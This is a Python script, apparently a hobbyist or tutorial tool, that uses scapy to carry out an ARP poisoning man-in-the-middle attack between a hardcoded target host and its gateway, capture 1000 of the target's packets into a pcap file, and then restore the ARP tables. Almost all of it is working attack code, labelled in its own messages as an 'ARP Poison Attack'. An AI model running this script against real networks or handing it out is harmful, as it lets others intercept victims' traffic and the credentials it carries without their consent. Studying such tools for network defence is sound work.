#!/usr/bin/env python3

'''
before using make sure to enable ip forwarding by ; 
echo 1 > /proc/sys/net/ipv4/ip_forward
'''

from scapy.all import *
import threading
import os
import signal
import time

interface = 'wlo1'

conf.iface = interface 
conf.verb = 0


def get_mac(ip_address):

	# send arp request and receive apr reply
	answer, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2, retry=10)

	# Return the mac address
	for s, r in answer :
		return r[Ether].src

	return None

def restore_target(target_ip, target_mac, gateway_ip, gateway_mac):
	'''
	stop poising attack and return normal state
	by sending the right arp packet to each one (target and gateway)

	operation code : 1 for request, 2 for reply
	'''

	send(ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
	send(ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff'), count=5)

	# signal the main thread to exit
	# stackoverflow for life
	os.kill(os.getpid(), signal.SIGUSR1)

def poison_target(target_ip, target_mac, gateway_ip, gateway_mac):
	'''
	poising arp between target and gateway
	'''

	# create arp packet to send to target, saying we are the gateway
	poison_target = ARP()
	poison_target.op = 2 # is-at reply
	poison_target.psrc = gateway_ip # saying the packet came from gateway, our hdsrc(hardware source ) will be inlcuded auto
	poison_target.pdst = target_ip
	poison_target.hwdst = target_mac

	# create arp packet to send to gateway, saying we are the target
	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac

	# send packets
	while True :
		try :
			send(poison_gateway)
			send(poison_target)

			time.sleep(2)
		except KeyboardInterrupt:
			restore_target(target_ip, target_mac, gateway_ip, gateway_mac)

	print('ARP Poison Attack Finished')
	return


def main():

	target_ip = '192.168.1.2'
	gateway_ip = '192.168.1.1'
	target_mac = get_mac(target_ip)
	gateway_mac = get_mac(gateway_ip)
	packet_count = 1000 # we are sniffing 1000 packets

	# check target and gateway MAC
	print("setting up interface ...")
	if target_mac == None :
		print("Failed to resolve target {} mac address.".format(target_ip, target_mac))
		exit()
	else :
		print("Target {} is at {}".format(target_ip, target_mac))

	if gateway_mac == None :
		print("Failed to resolve Gateway {} mac address ". format(gateway_ip))
		exit()
	else :
		print("Gateway {} is at {}".format(gateway_ip, gateway_mac))

	print("Poisoning target ...")
	# start poison thread
	poison = threading.Thread(target=poison_target, args=(target_ip, target_mac, gateway_ip, gateway_mac))
	poison.start()

	# sniff flowing packet and store them in pcap file (to analyse with wireshark)
	while True :
		try :
			print("Starting sniffer for {} packets ".format(packet_count))
			bpf = 'ip host {}'.format(target_ip)
			sniffed_packets = sniff(iface=interface, filter=bpf, count=packet_count)

			# store packet in pcap file
			wrpcap('sniffed_packets.pcap', sniffed_packets)
			# restore target
			print("Restoring target ...")
			restore_target(target_ip, target_mac, gateway_ip, gateway_mac)
			exit()
		except KeyboardInterrupt:
			print("Restoring target ...")
			restore_target(target_ip, target_mac, gateway_ip, gateway_mac)
			exit()

if __name__ == '__main__':
	main()